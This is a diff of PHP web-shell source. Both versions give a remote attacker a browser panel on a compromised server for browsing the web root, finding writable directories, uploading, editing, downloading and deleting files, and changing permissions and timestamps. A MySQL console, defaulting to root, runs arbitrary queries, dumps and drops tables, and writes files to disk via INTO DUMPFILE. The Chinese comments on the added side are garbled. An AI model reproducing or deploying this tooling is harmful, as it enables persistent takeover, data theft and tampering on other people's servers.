-	p('<a href="javascript:g(\'file\', \''.str_replace('\\','/',$web_cwd).'\');">WebRoot</a>');
-	p(' | <a href="javascript:g(\'file\', \''.$home_cwd.'\');">ScriptPath</a>');
-	p(' | <a href="javascript:g(\'file\',\''.$cwd.'\',null,null,null,\'dir\');">View Writable Directory</a> ');
-	p(' | <a href="javascript:createdir();">Create Directory</a> | <a href="javascript:createfile();">Create File</a>');
-	p('</td></tr>');
+	$findstr = $_POST['findstr'];
+	$re = $_POST['re'];
+	tbhead();
+	p('<tr class="alt1"><td colspan="7" style="padding:5px;line-height:20px;">');
+	p('<form action="'.$self.'" method="POST" enctype="multipart/form-data"><div style="float:right;"><input class="input" name="uploadfile" value="" type="file" /> <input class="bt" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="'.$nowpath.'" type="hidden" /><input name="dir" value="'.$nowpath.'" type="hidden" /></div></form>');
+	p('<a href="javascript:godir(\''.$_SERVER["DOCUMENT_ROOT"].'\');">WebRoot</a>');
+	p(' | <a href="javascript:godir(\'.\');">ScriptPath</a>');
+	p(' | <a href="javascript:godir(\''.$nowpath.'\');">View All</a>');
+	p(' | View Writable ( <a href="javascript:godir(\''.$nowpath.'\',\'dir\');">Directory</a>');
+	p(' | <a href="javascript:godir(\''.$nowpath.'\',\'file\');">File</a> )');
+	p(' | <a href="javascript:createdir();">Create Directory</a> | <a href="javascript:createfile(\''.$nowpath.'\');">Create File</a>');
 
-	$sort = array('filename', 1);
-	if($p1) {
-		if(preg_match('!s_([A-z_]+)_(\d{1})!', $p1, $match)) {
-			$sort = array($match[1], (int)$match[2]);
-		}
-	}
+	p('<div style="padding:5px 0;"><form action="'.$self.'" method="POST">Find string in files(current folder): <input class="input" name="findstr" value="'.$findstr.'" type="text" /> <input class="bt" value="Find" type="submit" /> Type: <input class="input" name="writabledb" value="'.$writabledb.'" type="text" /><input name="dir" value="'.$dir.'" type="hidden" /> <input name="re" value="1" type="checkbox" '.($re ? 'checked' : '').' /> Regular expressions</form></div></td></tr>');
 
-	formhead(array('name'=>'flist'));
-	makehide('act','file');
-	makehide('p1','');
-	makehide('cwd',$cwd);
-	makehide('charset',$charset);
-	p('<tr class="head">');
-	p('<td width="2%" nowrap><input name="chkall" value="on" type="checkbox" onclick="checkall(this.form)" /></td>');
-	p('<td><a href="javascript:g(\'file\',null,\'s_filename_'.($sort[1]?0:1).'\');">Filename</a> '.($p1 == 's_filename_0' ? $dchar : '').($p1 == 's_filename_1' || !$p1 ? $uchar : '').'</td>');
-	p('<td width="16%"><a href="javascript:g(\'file\',null,\'s_mtime_'.($sort[1]?0:1).'\');">Last modified</a> '.($p1 == 's_mtime_0' ? $dchar : '').($p1 == 's_mtime_1' ? $uchar : '').'</td>');
-	p('<td width="10%"><a href="javascript:g(\'file\',null,\'s_size_'.($sort[1]?0:1).'\');">Size</a> '.($p1 == 's_size_0' ? $dchar : '').($p1 == 's_size_1' ? $uchar : '').'</td>');
-	p('<td width="20%">Chmod / Perms</td>');
-	p('<td width="22%">Action</td>');
-	p('</tr>');
+	p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
 
-	//查看所有可写文件和目录
-	$dirdata=$filedata=array();
+	//鏌ョ湅鎵€鏈夊彲鍐欐枃浠跺拰鐩綍
+	$dirdata=array();
+	$filedata=array();
 
-	if ($p4 == 'dir') {
-		$dirdata = GetWDirList($cwd);
+	if ($view_writable == 'dir') {
+		$dirdata = GetWDirList($nowpath);
 		$filedata = array();
+	} elseif ($view_writable == 'file') {
+		$dirdata = array();
+		$filedata = GetWFileList($nowpath);
+	} elseif ($findstr) {
+		$dirdata = array();
+		$filedata = GetSFileList($nowpath, $findstr, $re);
 	} else {
-		// 默认目录列表
-		$dirs = @scandir($cwd);
-		if ($dirs) {
-			$dirs = array_diff($dirs, array('.'));
-			foreach ($dirs as $file) {
-				$filepath=$cwd.$file;
-				if(@is_dir($filepath)){
-					$dirdb['filename']=$file;
-					$dirdb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
-					$dirdb['chmod']=getChmod($filepath);
-					$dirdb['perm']=PermsColor($filepath);
-					$dirdb['owner']=getUser($filepath);
-					$dirdb['link']=$filepath;
-					if ($file=='..') {
-						$dirdata['up']=1;
-					} else {
-						$dirdata[]=$dirdb;
-					}
-				} else {
-					$filedb['filename']=$file;
-					//$filedb['size']=@filesize($filepath);
-					$filedb['size']=sprintf("%u", @filesize($filepath));
-					$filedb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
-					$filedb['chmod']=getChmod($filepath);
-					$filedb['perm']=PermsColor($filepath);
-					$filedb['owner']=getUser($filepath);
-					$filedb['link']=$filepath;
-					$filedata[]=$filedb;
-				}
+		// 鐩綍鍒楄〃
+		//scandir()鏁堢巼鏇撮珮
+		$dirs=@opendir($dir);
+		while ($file=@readdir($dirs)) {
+			$filepath=$nowpath.$file;
+			if(@is_dir($filepath)){
+				$dirdb['filename']=$file;
+				$dirdb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
+				$dirdb['dirchmod']=getChmod($filepath);
+				$dirdb['dirperm']=getPerms($filepath);
+				$dirdb['fileowner']=getUser($filepath);
+				$dirdb['dirlink']=$nowpath;
+				$dirdb['server_link']=$filepath;
+				$dirdata[]=$dirdb;
+			} else {
+				$filedb['filename']=$file;
+				$filedb['size']=sizecount(@filesize($filepath));
+				$filedb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
+				$filedb['filechmod']=getChmod($filepath);
+				$filedb['fileperm']=getPerms($filepath);
+				$filedb['fileowner']=getUser($filepath);
+				$filedb['dirlink']=$nowpath;
+				$filedb['server_link']=$filepath;
+				$filedata[]=$filedb;
 			}
-			unset($dirdb);
-			unset($filedb);
-		}
+		}// while
+		unset($dirdb);
+		unset($filedb);
+		@closedir($dirs);
 	}
+	@sort($dirdata);
+	@sort($filedata);
 	$dir_i = '0';
-	if (isset($dirdata['up'])) {
-		$thisbg = bg();
-		p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
-		p('<td align="center">-</td><td nowrap colspan="5"><a href="javascript:g(\'file\',\''.getUpPath($cwd).'\');">Parent Directory</a></td>');
-		p('</tr>');
-	}
-	unset($dirdata['up']);
-	usort($dirdata, 'cmp');
-	usort($filedata, 'cmp');
+
+	p('<form id="filelist" name="filelist" action="'.$self.'" method="post">');
+	makehide('action','file');
+	makehide('thefile');
+	makehide('doing');
+	makehide('dir',$nowpath);
+
 	foreach($dirdata as $key => $dirdb){
-		if($p1 == 'getsize' && $p2 == $dirdb['filename']) {
-			$attachsize = dirsize($p2);
-			$attachsize = is_numeric($attachsize) ? sizecount($attachsize) : 'Unknown';
+		if($dirdb['filename']!='..' && $dirdb['filename']!='.') {
+			if($getdir && $getdir == $dirdb['server_link']) {
+				$attachsize = dirsize($dirdb['server_link']);
+				$attachsize = is_numeric($attachsize) ? sizecount($attachsize) : 'Unknown';
+			} else {
+				$attachsize = '<a href="javascript:getsize(\''.$dirdb['server_link'].'\',\''.$dir.'\');">Stat</a>';
+			}
+			$thisbg = bg();
+			p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
+			p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="'.$dirdb['server_link'].'"></td>');
+			p('<td><a href="javascript:godir(\''.$dirdb['server_link'].'\');">'.$dirdb['filename'].'</a></td>');
+			p('<td nowrap><a href="javascript:opfile(\'newtime\',\''.$dirdb['server_link'].'\',\''.$dirdb['dirlink'].'\');">'.$dirdb['mtime'].'</a></td>');
+			p('<td nowrap>'.$attachsize.'</td>');
+			p('<td nowrap>');
+			p('<a href="javascript:fileperm(\''.$dirdb['server_link'].'\');">'.$dirdb['dirchmod'].'</a> / ');
+			p('<a href="javascript:fileperm(\''.$dirdb['server_link'].'\');">'.$dirdb['dirperm'].'</a>'.$dirdb['fileowner'].'</td>');
+			p('<td nowrap><a href="javascript:rename(\''.$dirdb['server_link'].'\');">Rename</a></td>');
+			p('</tr>');
+			$dir_i++;
 		} else {
-			$attachsize = '<a href="javascript:g(\'file\', null, \'getsize\', \''.$dirdb['filename'].'\');">Stat</a>';
+			if($dirdb['filename']=='..') {
+				p('<tr class='.bg().'>');
+				p('<td align="center">-</td><td nowrap colspan="5"><a href="javascript:godir(\''.getUpPath($nowpath).'\');">Parent Directory</a></td>');
+				p('</tr>');
+			}
 		}
-		$thisbg = bg();
-		p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
-		p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="'.$dirdb['filename'].'"></td>');
-		p('<td><a href="javascript:g(\'file\',\''.$dirdb['link'].'\')">'.$dirdb['filename'].'</a></td>');
-		p('<td nowrap><a href="javascript:g(\'newtime\',null,\''.$dirdb['filename'].'\');">'.$dirdb['mtime'].'</a></td>');
-		p('<td nowrap>'.$attachsize.'</td>');
-		p('<td nowrap>');
-		p('<a href="javascript:fileperm(\''.$dirdb['filename'].'\', \''.$dirdb['chmod'].'\');">'.$dirdb['chmod'].'</a> / ');
-		p('<a href="javascript:fileperm(\''.$dirdb['filename'].'\', \''.$dirdb['chmod'].'\');">'.$dirdb['perm'].'</a>'.$dirdb['owner'].'</td>');
-		p('<td nowrap><a href="javascript:rename(\''.$dirdb['filename'].'\');">Rename</a></td>');
-		p('</tr>');
-		$dir_i++;
 	}
 
 	p('<tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"><td colspan="6" height="5"></td></tr>');
 	$file_i = '0';
 
 	foreach($filedata as $key => $filedb){
-		$fileurl = '/'.str_replace($web_cwd,'',$filedb['link']);
-		$thisbg = bg();
-		p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
-		p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="'.$filedb['filename'].'"></td>');
-		p('<td>'.((strpos($filedb['link'], $web_cwd) !== false) ? '<a href="'.$fileurl.'" target="_blank">'.$filedb['filename'].'</a>' : $filedb['filename']).'</td>');
-		p('<td nowrap><a href="javascript:g(\'newtime\',null,\''.$filedb['filename'].'\');">'.$filedb['mtime'].'</a></td>');
-		p('<td nowrap>'.sizecount($filedb['size']).'</td>');
-		p('<td nowrap>');
-		p('<a href="javascript:fileperm(\''.$filedb['filename'].'\', \''.$filedb['chmod'].'\');">'.$filedb['chmod'].'</a> / ');
-		p('<a href="javascript:fileperm(\''.$filedb['filename'].'\', \''.$filedb['chmod'].'\');">'.$filedb['perm'].'</a>'.$filedb['owner'].'</td>');
-		p('<td nowrap>');
-		p('<a href="javascript:g(\'down\',null,\''.$filedb['filename'].'\');">Down</a> | ');
-		p('<a href="javascript:g(\'editfile\',null,null,\''.$filedb['filename'].'\');">Edit</a> | ');
-		p('<a href="javascript:rename(\''.$filedb['filename'].'\');">Rename</a>');
-		p('</td></tr>');
-		$file_i++;
+		if($filedb['filename']!='..' && $filedb['filename']!='.') {
+			$fileurl = str_replace($_SERVER["DOCUMENT_ROOT"],'',$filedb['server_link']);
+			$thisbg = bg();
+			p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
+			p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="'.$filedb['server_link'].'"></td>');
+			p('<td>'.((strpos($filedb['server_link'], $_SERVER["DOCUMENT_ROOT"]) !== false) ? '<a href="'.$fileurl.'" target="_blank">'.$filedb['filename'].'</a>' : $filedb['filename']).'</td>');
+			p('<td nowrap><a href="javascript:opfile(\'newtime\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">'.$filedb['mtime'].'</a></td>');
+			p('<td nowrap>'.$filedb['size'].'</td>');
+			p('<td nowrap>');
+			p('<a href="javascript:fileperm(\''.$filedb['server_link'].'\');">'.$filedb['filechmod'].'</a> / ');
+			p('<a href="javascript:fileperm(\''.$filedb['server_link'].'\');">'.$filedb['fileperm'].'</a>'.$filedb['fileowner'].'</td>');
+			p('<td nowrap>');
+			p('<a href="javascript:dofile(\'downfile\',\''.$filedb['server_link'].'\');">Down</a> | ');
+			p('<a href="javascript:copyfile(\''.$filedb['server_link'].'\');">Copy</a> | ');
+			p('<a href="javascript:opfile(\'editfile\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">Edit</a> | ');
+			p('<a href="javascript:rename(\''.$filedb['server_link'].'\');">Rename</a>');
+			p('</td></tr>');
+			$file_i++;
+		}
 	}
-	p('<tr class="'.bg().' head"><td colspan="5"><a href="#" onclick="$(\'flist\').p1.value=\'delete\';$(\'flist\').submit();">Delete</a> | <a href="#" onclick="$(\'flist\').p1.value=\'copy\';$(\'flist\').submit();">Copy</a> | <a href="#" onclick="$(\'flist\').p1.value=\'move\';$(\'flist\').submit();">Move</a>'.(isset($_SESSION['do']) && @count($_SESSION['dl']) ? ' | <a href="#" onclick="$(\'flist\').p1.value=\'paste\';$(\'flist\').submit();">Paste</a>' : '').'</td><td align="right">'.$dir_i.' directories / '.$file_i.' files</td></tr>');
+	p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
+	p('<tr class="'.bg().'"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td colspan="4"><a href="javascript:dofile(\'delfiles\');">Delete selected</a></td><td align="right">'.$dir_i.' directories / '.$file_i.' files</td></tr>');
 	p('</form></table>');
 }// end dir
 
-elseif ($act == 'mysqladmin') {
-	$order = isset($P['order']) ? $P['order'] : '';
-	$dbhost = isset($P['dbhost']) ? $P['dbhost'] : '';
-	$dbuser = isset($P['dbuser']) ? $P['dbuser'] : '';
-	$dbpass = isset($P['dbpass']) ? $P['dbpass'] : '';
-	$dbname = isset($P['dbname']) ? $P['dbname'] : '';
-	$tablename = isset($P['tablename']) ? $P['tablename'] : '';
-
-	if ($doing == 'dump') {
-		if (isset($P['bak_table']) && $P['bak_table']) {
-			$DB = new DB_MySQL;
-			$DB->charsetdb = $charsetdb;
-			$DB->charset = $charset;
-			$DB->connect($dbhost, $dbuser, $dbpass, $dbname);
-			if ($P['saveasfile'] && $P['bak_path']) {
-				$fp = @fopen($P['bak_path'],'w');
-				if ($fp) {
-					foreach($P['bak_table'] as $k => $v) {
-						if ($v) {
-							$DB->sqldump($v, $fp);
-						}
-					}
-					fclose($fp);
-					$fileurl = str_replace(SA_ROOT,'',$P['bak_path']);
-					m('Database has backup to <a href="'.$fileurl.'" target="_blank">'.$P['bak_path'].'</a>');
-				} else {
-					m('Backup failed');
-				}
-			} else {
-				@ob_end_clean();
-				$filename = basename($dbname.'.sql');
-				header('Content-type: application/unknown');
-				header('Content-Disposition: attachment; filename='.$filename);
-				foreach($P['bak_table'] as $k => $v) {
-					if ($v) {
-						$DB->sqldump($v);
-					}
-				}
-				exit;
-			}
-			$DB->close();
+elseif ($action == 'sqlfile') {
+	if($doing=="mysqlupload"){
+		$file = $_FILES['uploadfile'];
+		$filename = $file['tmp_name'];
+		if (file_exists($savepath)) {
+			m('The goal file has already existed');
 		} else {
-			m('Please choose the table');
+			if(!$filename) {
+				m('Please choose a file');
+			} else {
+				$fp=@fopen($filename,'r');
+				$contents=@fread($fp, filesize($filename));
+				@fclose($fp);
+				$contents = bin2hex($contents);
+				if(!$upname) $upname = $file['name'];
+				$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
+				$result = q("SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';");
+				m($result ? 'Upload success' : 'Upload has failed: '.mysql_error());
+			}
 		}
-		$doing = '';
 	}
-
-	formhead(array('title'=>'MYSQL Manager', 'name'=>'dbform'));
-	makehide('act','mysqladmin');
-	makehide('doing',$doing);
-	makehide('charset', $charset);
-	makehide('tablename', $tablename);
-	makehide('order', $order);
+?>
+<script type="text/javascript">
+function mysqlfile(doing){
+	if(!doing) return;
+	$('doing').value=doing;
+	$('mysqlfile').dbhost.value=$('dbinfo').dbhost.value;
+	$('mysqlfile').dbport.value=$('dbinfo').dbport.value;
+	$('mysqlfile').dbuser.value=$('dbinfo').dbuser.value;
+	$('mysqlfile').dbpass.value=$('dbinfo').dbpass.value;
+	$('mysqlfile').dbname.value=$('dbinfo').dbname.value;
+	$('mysqlfile').charset.value=$('dbinfo').charset.value;
+	$('mysqlfile').submit();
+}
+</script>
+<?php
+	!$dbhost && $dbhost = 'localhost';
+	!$dbuser && $dbuser = 'root';
+	!$dbport && $dbport = '3306';
+	formhead(array('title'=>'MYSQL Information','name'=>'dbinfo'));
+	makehide('action','sqlfile');
 	p('<p>');
 	p('DBHost:');
 	makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
+	p(':');
+	makeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));
 	p('DBUser:');
 	makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
 	p('DBPass:');
 	makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
-	makeinput(array('value'=>'Connect','type'=>'submit','class'=>'bt'));
+	p('DBName:');
+	makeinput(array('name'=>'dbname','size'=>15,'value'=>$dbname));
+	p('DBCharset:');
+	makeselect(array('name'=>'charset','option'=>$charsetdb,'selected'=>$charset,'nokey'=>1));
 	p('</p>');
+	formfoot();
+	p('<form action="'.$self.'" method="POST" enctype="multipart/form-data" name="mysqlfile" id="mysqlfile">');
+	p('<h2>Upload file</h2>');
+	p('<p><b>This operation the DB user must has FILE privilege</b></p>');
+	p('<p>Save path(fullpath): <input class="input" name="savepath" size="45" type="text" /> Choose a file: <input class="input" name="uploadfile" type="file" /> <a href="javascript:mysqlfile(\'mysqlupload\');">Upload</a></p>');
+	p('<h2>Download file</h2>');
+	p('<p>File: <input class="input" name="mysqldlfile" size="115" type="text" /> <a href="javascript:mysqlfile(\'mysqldown\');">Download</a></p>');
+	makehide('dbhost');
+	makehide('dbport');
+	makehide('dbuser');
+	makehide('dbpass');
+	makehide('dbname');
+	makehide('charset');
+	makehide('doing');
+	makehide('action','sqlfile');
+	p('</form>');
+}
 
-	if ($dbhost && $dbuser && isset($dbpass)) {
+elseif ($action == 'mysqladmin') {
+	!$dbhost && $dbhost = 'localhost';
+	!$dbuser && $dbuser = 'root';
+	!$dbport && $dbport = '3306';
+	$dbform = '<input type="hidden" id="connect" name="connect" value="1" />';
+	if(isset($dbhost)){
+		$dbform .= "<input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\"$dbhost\" />\n";
+	}
+	if(isset($dbuser)) {
+		$dbform .= "<input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"$dbuser\" />\n";
+	}
+	if(isset($dbpass)) {
+		$dbform .= "<input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"$dbpass\" />\n";
+	}
+	if(isset($dbport)) {
+		$dbform .= "<input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\"$dbport\" />\n";
+	}
+	if(isset($dbname)) {
+		$dbform .= "<input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"$dbname\" />\n";
+	}
+	if(isset($charset)) {
+		$dbform .= "<input type=\"hidden\" id=\"charset\" name=\"charset\" value=\"$charset\" />\n";
+	}
 
-		// 初始化数据库类
-		$DB = new DB_MySQL;
-		$DB->charsetdb = $charsetdb;
-		$DB->charset = $charset;
-		$DB->connect($dbhost, $dbuser, $dbpass, $dbname);
+	if ($doing == 'backupmysql' && $saveasfile) {
+		if (!$table) {
+			m('Please choose the table');
+		} else {
+			$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
+			$fp = @fopen($path,'w');
+			if ($fp) {
+				foreach($table as $k => $v) {
+					if ($v) {
+						sqldumptable($v, $fp);
+					}
+				}
+				fclose($fp);
+				$fileurl = str_replace(SA_ROOT,'',$path);
+				m('Database has success backup to <a href="'.$fileurl.'" target="_blank">'.$path.'</a>');
+				mysql_close();
+			} else {
+				m('Backup failed');
+			}
+		}
+	}
+	if ($insert && $insertsql) {
+		$keystr = $valstr = $tmp = '';
+		foreach($insertsql as $key => $val) {
+			if ($val) {
+				$keystr .= $tmp.$key;
+				$valstr .= $tmp."'".addslashes($val)."'";
+				$tmp = ',';
+			}
+		}
+		if ($keystr && $valstr) {
+			$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
+			m(q("INSERT INTO $tablename ($keystr) VALUES ($valstr)") ? 'Insert new record of success' : mysql_error());
+		}
+	}
+	if ($update && $insertsql && $base64) {
+		$valstr = $tmp = '';
+		foreach($insertsql as $key => $val) {
+			$valstr .= $tmp.$key."='".addslashes($val)."'";
+			$tmp = ',';
+		}
+		if ($valstr) {
+			$where = base64_decode($base64);
+			$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
+			m(q("UPDATE $tablename SET $valstr WHERE $where LIMIT 1") ? 'Record updating' : mysql_error());
+		}
+	}
+	if ($doing == 'del' && $base64) {
+		$where = base64_decode($base64);
+		$delete_sql = "DELETE FROM $tablename WHERE $where";
+		$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
+		m(q("DELETE FROM $tablename WHERE $where") ? 'Deletion record of success' : mysql_error());
+	}
 
-		//获取数据库信息
-		p('<p class="red">MySQL '.$DB->version().' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');
-		$highver = $DB->version() > '4.1' ? 1 : 0;
+	if ($tablename && $doing == 'drop') {
+		$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
+		if (q("DROP TABLE $tablename")) {
+			m('Drop table of success');
+			$tablename = '';
+		} else {
+			m(mysql_error());
+		}
+	}
 
-		//获取数据库
-		$query = $DB->query("SHOW DATABASES");
+	formhead(array('title'=>'MYSQL Manager'));
+	makehide('action','mysqladmin');
+	p('<p>');
+	p('DBHost:');
+	makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
+	p(':');
+	makeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));
+	p('DBUser:');
+	makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
+	p('DBPass:');
+	makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
+	p('DBCharset:');
+	makeselect(array('name'=>'charset','option'=>$charsetdb,'selected'=>$charset,'nokey'=>1));
+	makeinput(array('name'=>'connect','value'=>'Connect','type'=>'submit','class'=>'bt'));
+	p('</p>');
+	formfoot();
+
+	//鎿嶄綔璁板綍
+	formhead(array('name'=>'recordlist'));
+	makehide('doing');
+	makehide('action','mysqladmin');
+	makehide('base64');
+	makehide('tablename');
+	p($dbform);
+	formfoot();
+
+	//閫夊畾鏁版嵁搴�
+	formhead(array('name'=>'setdbname'));
+	makehide('action','mysqladmin');
+	p($dbform);
+	if (!$dbname) {
+		makehide('dbname');
+	}
+	formfoot();
+
+	//閫夊畾琛�
+	formhead(array('name'=>'settable'));
+	makehide('action','mysqladmin');
+	p($dbform);
+	makehide('tablename');
+	makehide('page',$page);
+	makehide('doing');
+	formfoot();
+
+	$cachetables = array();
+	$pagenum = 30;
+	$page = intval($page);
+	if($page) {
+		$start_limit = ($page - 1) * $pagenum;
+	} else {
+		$start_limit = 0;
+		$page = 1;
+	}
+	if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
+		$mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
+		//鑾峰彇鏁版嵁搴撲俊鎭�
+		$mysqlver = mysql_get_server_info();
+		p('<p>MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');
+		$highver = $mysqlver > '4.1' ? 1 : 0;
+
+		//鑾峰彇鏁版嵁搴�
+		$query = q("SHOW DATABASES");
 		$dbs = array();
 		$dbs[] = '-- Select a database --';
-		while($db = $DB->fetch($query)) {
+		while($db = mysql_fetch_array($query)) {
 			$dbs[$db['Database']] = $db['Database'];
 		}
-		makeselect(array('name'=>'dbname','option'=>$dbs,'selected'=>$dbname,'onchange'=>'setdb(this.options[this.selectedIndex].value)'));
-
+		makeselect(array('title'=>'Please select a database:','name'=>'db[]','option'=>$dbs,'selected'=>$dbname,'onchange'=>'moddbname(this.options[this.selectedIndex].value)','newline'=>1));
+		$tabledb = array();
 		if ($dbname) {
-			p('<p>Current dababase: <a href="javascript:setdb(\''.$dbname.'\');">'.$dbname.'</a>');
+			p('<p>');
+			p('Current dababase: <a href="javascript:moddbname(\''.$dbname.'\');">'.$dbname.'</a>');
 			if ($tablename) {
-				p(' | Current Table: <a href="javascript:settable(\''.$tablename.'\');">'.$tablename.'</a> [ <a href="javascript:settable(\''.$tablename.'\', \'structure\');">Structure</a> ]');
+				p(' | Current Table: <a href="javascript:settable(\''.$tablename.'\');">'.$tablename.'</a> [ <a href="javascript:settable(\''.$tablename.'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$tablename.'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$tablename.'\', \'drop\');">Drop</a> ]');
 			}
 			p('</p>');
+			mysql_select_db($dbname);
 
-			$sql_query = isset($P['sql_query']) ? $P['sql_query'] : '';
-
-			if ($tablename && !$sql_query) {
-				$sql_query = "SELECT * FROM $tablename LIMIT 0, 30";
-			}
-			if ($tablename && $doing == 'structure') {
-				$sql_query = "SHOW FULL COLUMNS FROM $tablename;\n";
-				$sql_query .= "SHOW INDEX FROM $tablename;";
-			}
-			p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database '.$dbname.':</td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">'.htmlspecialchars($sql_query,ENT_QUOTES).'</textarea></td><td style="padding:0 5px;"><input class="bt" onclick="$(\'doing\').value=\'\'" style="height:50px;" type="submit" value="Query" /></td></tr></table></p>');
+			$getnumsql = '';
+			$runquery = 0;
 			if ($sql_query) {
-				$querys = @explode(';',$sql_query);
-				foreach($querys as $num=>$query) {
-					if ($query) {
-						p("<p class=\"red b\">Query#{$num} : ".htmlspecialchars($query,ENT_QUOTES)."</p>");
-						switch($DB->query_res($query))
-						{
-							case 0:
-								p('<h2>'.$DB->halt('Error').'</h2>');
-								break;
-							case 1:
-								$result = $DB->query($query);
-								$tatol = $DB->num_rows($result);
-								p('<table border="0" cellpadding="3" cellspacing="0">');
-								p('<tr class="head">');
-								$fieldnum = @mysql_num_fields($result);
-								for($i=0;$i<$fieldnum;$i++){
-									p('<td nowrap>'.@mysql_field_name($result, $i).'</td>');
-								}
-								p('</tr>');
+				$runquery = 1;
+			}
+			$allowedit = 0;
+			if ($tablename && !$sql_query) {
+				$sql_query = "SELECT * FROM $tablename";
+				$getnumsql = $sql_query;
+				$sql_query = $sql_query." LIMIT $start_limit, $pagenum";
+				$allowedit = 1;
+			}
+			p('<form action="'.$self.'" method="POST">');
+			p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database '.$dbname.':</td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">'.htmlspecialchars($sql_query,ENT_QUOTES).'</textarea></td><td style="padding:0 5px;"><input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /></td></tr></table></p>');
+			makehide('tablename', $tablename);
+			makehide('action','mysqladmin');
+			p($dbform);
+			p('</form>');
+			if ($tablename || ($runquery && $sql_query)) {
+				if ($doing == 'structure') {
+					$result = q("SHOW FULL COLUMNS FROM $tablename");
+					$rowdb = array();
+					while($row = mysql_fetch_array($result)) {
+						$rowdb[] = $row;
+					}
+					p('<h3>Structure</h3>');
+					p('<table border="0" cellpadding="3" cellspacing="0">');
+					p('<tr class="head">');
+					p('<td>Field</td>');
+					p('<td>Type</td>');
+					p('<td>Collation</td>');
+					p('<td>Null</td>');
+					p('<td>Key</td>');
+					p('<td>Default</td>');
+					p('<td>Extra</td>');
+					p('<td>Privileges</td>');
+					p('<td>Comment</td>');
+					p('</tr>');
+					foreach ($rowdb as $row) {
+						$thisbg = bg();
+						p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
+						p('<td>'.$row['Field'].'</td>');
+						p('<td>'.$row['Type'].'</td>');
+						p('<td>'.$row['Collation'].'&nbsp;</td>');
+						p('<td>'.$row['Null'].'&nbsp;</td>');
+						p('<td>'.$row['Key'].'&nbsp;</td>');
+						p('<td>'.$row['Default'].'&nbsp;</td>');
+						p('<td>'.$row['Extra'].'&nbsp;</td>');
+						p('<td>'.$row['Privileges'].'&nbsp;</td>');
+						p('<td>'.$row['Comment'].'&nbsp;</td>');
+						p('</tr>');
+					}
+					tbfoot();
+					$result = q("SHOW INDEX FROM $tablename");
+					$rowdb = array();
+					while($row = mysql_fetch_array($result)) {
+						$rowdb[] = $row;
+					}
+					p('<h3>Indexes</h3>');
+					p('<table border="0" cellpadding="3" cellspacing="0">');
+					p('<tr class="head">');
+					p('<td>Keyname</td>');
+					p('<td>Type</td>');
+					p('<td>Unique</td>');
+					p('<td>Packed</td>');
+					p('<td>Seq_in_index</td>');
+					p('<td>Field</td>');
+					p('<td>Cardinality</td>');
+					p('<td>Collation</td>');
+					p('<td>Null</td>');
+					p('<td>Comment</td>');
+					p('</tr>');
+					foreach ($rowdb as $row) {
+						$thisbg = bg();
